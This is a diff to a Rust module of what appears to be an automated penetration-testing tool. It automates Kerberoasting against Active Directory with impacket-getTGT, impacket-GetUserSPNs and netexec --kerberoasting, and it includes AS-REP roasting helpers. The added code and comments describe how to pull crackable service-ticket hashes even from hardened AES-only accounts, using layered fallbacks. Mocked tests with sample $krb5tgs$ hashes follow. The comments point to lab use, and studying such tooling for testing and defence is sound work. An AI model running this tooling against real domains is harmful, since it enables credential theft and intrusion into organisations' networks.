@@ -9,21 +9,144 @@ use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
 /// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
+///
+/// Given a cleartext password, `impacket-GetUserSPNs` deliberately derives NT
+/// hashes and requests an **RC4** TGT ("to maximize the probability of getting
+/// session tickets with RC4 etype"). The service ticket it then requests only
+/// offers RC4/DES, so an AES-only SPN account — one whose
+/// `msDS-SupportedEncryptionTypes` excludes RC4, the hardened / GOAD default —
+/// answers `KDC_ERR_ETYPE_NOSUPP` and *no hash is returned at all*. The deployed
+/// impacket predates the `-no-rc4` flag that suppresses this, so we obtain an
+/// AES TGT out-of-band with `impacket-getTGT` and roast against that ccache
+/// (`-k -no-pass`). The TGS request then offers the TGT's AES enctype and the
+/// KDC issues an AES (etype 17/18) ticket. RC4-capable accounts still yield RC4
+/// tickets because RC4 stays first in the requested etype list, so this is a
+/// strict superset of the direct-password roast, which we keep as a fallback
+/// for when getTGT can't run (missing binary, clock skew, unusual cred format).
+///
+/// When neither impacket attempt returns a `$krb5tgs$` hash we make a final
+/// pass with `netexec --kerberoasting` (see [`netexec_kerberoast`]) — an
+/// independent code path that can still succeed where impacket strikes out.
 pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
     let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
 
-    let target = format!("{domain}/{username}:{password}");
+    let target_pw = format!("{domain}/{username}:{password}");
 
-    CommandBuilder::new("impacket-GetUserSPNs")
-        .arg(&target)
+    let no_rc4 = crate::credentials::etype_hint_is_aes_only(args);
+
+    // Preferred path: AES TGT via getTGT, then roast against the ccache so the
+    // KDC will issue AES service tickets for AES-only accounts.
+    if let Ok(dir) = tempfile::tempdir() {
+        let tgt = CommandBuilder::new("impacket-getTGT")
+            .arg(&target_pw)
+            .flag("-dc-ip", dc_ip)
+            .current_dir(dir.path())
+            .timeout_secs(60)
+            .execute()
+            .await;
+
+        // impacket-getTGT writes `<username>.ccache` into the working directory.
+        let ccache = dir.path().join(format!("{username}.ccache"));
+        if tgt.is_ok() && ccache.exists() {
+            let target_k = format!("{domain}/{username}");
+            let roast = CommandBuilder::new("impacket-GetUserSPNs")
+                .arg(&target_k)
+                .arg("-k")
+                .arg("-no-pass")
+                .flag("-dc-ip", dc_ip)
+                .arg("-request")
+                .arg_if(no_rc4, "-no-rc4")
+                .env("KRB5CCNAME", ccache.to_string_lossy().to_string())
+                .timeout_secs(60)
+                .execute()
+                .await;
+            // Only accept the AES ccache roast if it actually returned a hash;
+            // otherwise fall through to the password roast and netexec fallback
+            // rather than surfacing an empty AES result as the final answer.
+            if matches!(&roast, Ok(o) if o.combined_raw().contains("$krb5tgs$")) {
+                return roast;
+            }
+        }
+    }
+
+    // Fallback 1: direct password roast (RC4 TGT). Works for RC4-capable accounts.
+    let pw_roast = CommandBuilder::new("impacket-GetUserSPNs")
+        .arg(&target_pw)
         .flag("-dc-ip", dc_ip)
         .arg("-request")
+        .arg_if(no_rc4, "-no-rc4")
         .timeout_secs(60)
         .execute()
-        .await
+        .await;
+    if matches!(&pw_roast, Ok(o) if o.combined_raw().contains("$krb5tgs$")) {
+        return pw_roast;
+    }
+
+    // Fallback 2: netexec `--kerberoasting`, KDC pinned by IP. impacket's roast
+    // can strike out on AES-only SPNs when getTGT can't run (clock skew, missing
+    // binary); netexec is an independent path that may still land a hash.
+    match netexec_kerberoast(domain, username, password, dc_ip).await {
+        Ok(nxc) if nxc.combined_raw().contains("$krb5tgs$") => Ok(nxc),
+        // netexec found nothing either — return the password-roast result so the
+        // caller sees impacket's (more actionable) error output, not netexec's.
+        _ => pw_roast,
+    }
+}
+
+/// Kerberoast fallback via `netexec ldap ... --kerberoasting`.
+///
+/// The load-bearing flag is `--kdcHost <dc_ip>`. Without it netexec (through
+/// impacket) resolves the KDC from the realm *name* — e.g. `CONTOSO.LOCAL:88` —
+/// over DNS. On isolated lab boxes with no AD-integrated DNS resolver that
+/// lookup fails, netexec never issues the TGS-REQ, and the whole path is a
+/// non-starter as a fallback for the AES-only accounts impacket also misses.
+/// Pinning the KDC to the DC IP makes netexec viable for exactly those accounts.
+async fn netexec_kerberoast(
+    domain: &str,
+    username: &str,
+    password: &str,
+    dc_ip: &str,
+) -> Result<ToolOutput> {
+    // Unique output path so overlapping roasts within one process don't collide.
+    let out_file = format!(
+        "/tmp/nxc_kerberoast_{}_{}.txt",
+        std::process::id(),
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos())
+            .unwrap_or(0)
+    );
+
+    let mut result = CommandBuilder::new("netexec")
+        .arg("ldap")
+        .arg(dc_ip)
+        .flag("-u", username)
+        .flag("-p", password)
+        .flag("-d", domain)
+        .flag("--kdcHost", dc_ip)
+        .flag("--kerberoasting", out_file.as_str())
+        .timeout_secs(120)
+        .execute()
+        .await?;
+
+    // netexec writes the TGS blobs to `--kerberoasting <file>`; fold them into
+    // stdout so the downstream `$krb5tgs$` extractor sees them even on builds
+    // that stay quiet on the console.
+    if !result.stdout.contains("$krb5tgs$") {
+        if let Ok(file_hashes) = std::fs::read_to_string(&out_file) {
+            if !file_hashes.trim().is_empty() {
+                if !result.stdout.is_empty() {
+                    result.stdout.push('\n');
+                }
+                result.stdout.push_str(&file_hashes);
+            }
+        }
+    }
+    let _ = std::fs::remove_file(&out_file);
+    Ok(result)
 }
 
 /// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
@@ -96,7 +219,6 @@ pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
                 .flag("-usersfile", seclists)
                 .arg("-no-pass");
         } else {
-            // Write built-in AD usernames to a temp file
             let tmp = format!("/tmp/asrep_users_{}.txt", std::process::id());
             std::fs::write(&tmp, DEFAULT_AD_USERNAMES)?;
             cmd = cmd.arg(&target).flag("-usersfile", &tmp).arg("-no-pass");
@@ -191,8 +313,6 @@ mod tests {
     use crate::args::{optional_str, required_str};
     use serde_json::json;
 
-    // --- kerberoast ---
-
     #[test]
     fn kerberoast_target_format() {
         let domain = "contoso.local";
@@ -241,8 +361,6 @@ mod tests {
         });
         assert!(required_str(&args, "dc_ip").is_err());
     }
-
-    // --- asrep_roast ---
 
     #[test]
     fn asrep_roast_authenticated_format() {
@@ -294,8 +412,6 @@ mod tests {
         assert_eq!(users_file, Some("/tmp/users.txt"));
     }
 
-    // --- DEFAULT_AD_USERNAMES ---
-
     #[test]
     fn default_ad_usernames_is_non_empty() {
         assert!(!super::DEFAULT_AD_USERNAMES.is_empty());
@@ -310,8 +426,6 @@ mod tests {
     fn default_ad_usernames_contains_krbtgt() {
         assert!(super::DEFAULT_AD_USERNAMES.contains("krbtgt"));
     }
-
-    // --- kerberos_user_enum_noauth ---
 
     #[test]
     fn kerberos_user_enum_requires_domain() {
@@ -354,18 +468,57 @@ mod tests {
         assert!(optional_str(&args, "users_file").is_none());
     }
 
-    // --- mock executor tests ---
-
     use crate::executor::mock;
 
     #[tokio::test]
     async fn kerberoast_executes() {
-        mock::push(mock::success());
+        // Three spawns: getTGT, the password roast, then the netexec fallback.
+        // In tests no real ccache file is written, so the flow takes
+        // getTGT -> (ccache missing) -> password roast (no hash) -> netexec
+        // fallback. Each needs a queued mock or execute() would try to spawn
+        // the real binaries.
+        mock::push(mock::success()); // impacket-getTGT
+        mock::push(mock::success()); // impacket-GetUserSPNs (password roast)
+        mock::push(mock::success()); // netexec --kerberoasting (fallback)
         let args = json!({
             "domain": "contoso.local", "username": "admin",
             "password": "P@ss", "dc_ip": "192.168.58.1"
         });
         assert!(super::kerberoast(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn kerberoast_password_roast_hash_short_circuits() {
+        // getTGT writes no ccache in tests, so the flow reaches the password
+        // roast. When that returns a $krb5tgs$ hash the netexec fallback must
+        // NOT run — only two mocks are queued, so a stray third spawn would
+        // fall through to real execution and fail the test.
+        mock::push(mock::success()); // impacket-getTGT
+        mock::push(mock::success_with_stdout(
+            "$krb5tgs$23$*svc_sql$CONTOSO.LOCAL$contoso.local/svc_sql*$abc$def",
+        )); // password roast returns a hash
+        let args = json!({
+            "domain": "contoso.local", "username": "svc_sql",
+            "password": "P@ss", "dc_ip": "192.168.58.1"
+        });
+        let out = super::kerberoast(&args).await.unwrap();
+        assert!(out.stdout.contains("$krb5tgs$"));
+    }
+
+    #[tokio::test]
+    async fn kerberoast_falls_back_to_netexec_when_impacket_dry() {
+        // Both impacket attempts return no hash; the netexec fallback lands one.
+        mock::push(mock::success()); // impacket-getTGT
+        mock::push(mock::success()); // password roast, no hash
+        mock::push(mock::success_with_stdout(
+            "$krb5tgs$23$*svc_web$CONTOSO.LOCAL$contoso.local/svc_web*$aa$bb",
+        )); // netexec --kerberoasting returns a hash
+        let args = json!({
+            "domain": "contoso.local", "username": "svc_web",
+            "password": "P@ss", "dc_ip": "192.168.58.1"
+        });
+        let out = super::kerberoast(&args).await.unwrap();
+        assert!(out.stdout.contains("$krb5tgs$"));
     }
 
     #[tokio::test]
